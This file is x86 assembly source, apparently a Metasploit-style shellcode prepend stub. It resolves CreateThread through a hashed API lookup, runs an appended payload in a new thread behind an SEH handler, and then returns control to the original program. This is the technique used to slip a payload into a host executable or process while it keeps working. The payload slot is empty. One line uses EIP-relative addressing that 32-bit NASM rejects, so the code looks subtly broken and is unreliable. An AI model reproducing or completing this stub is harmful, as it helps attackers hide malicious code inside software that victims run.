
[BITS 32]
[ORG 0]

  cld
  call start
delta:
%include "block_api.asm"
start:
  pop ebp ; pop off the address of 'api_call' for calling later.
  xor eax, eax
  push eax
  push eax
  push eax
  lea ebx, [ebp+threadstart-delta]
  push ebx
  push eax
  push eax
  push 0x160D6838 ; hash( "kernel32.dll", "CreateThread" )
  call ebp ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  popa ; A
  sub dword [esp], 5	; length of original call (5 bytes)
  ret
threadstart:
  pop eax ; pop off the unused thread param so the prepended shellcode can just return when done.
  ;pusha       ; save all registers for later
  call seh_prolog ; pushes eip on the stack
seh_prolog:
  ;add dword [esp],byte +0x1a
  push dword [eip+seh_handler] 
  push dword [fs:0] ;address of next SEH structure
  mov [fs:0], esp ;give fs:[0] the SEH address just made
  ;sub esp,0x100
  ;jmp short 0x32
  call shellcode
;seh_epilog:
  ;mov esp,[esp+0x8]
  pop dword [fs:0] ;restore next SEH structure to FS:[0] 
  add esp, 4 ;throw away rest of SEH structure 
  ;popa
  ret
seh_handler:
  xor eax, eax ; eax = 0 => reload context & continue execution
  ret
shellcode:
  ; woohoo
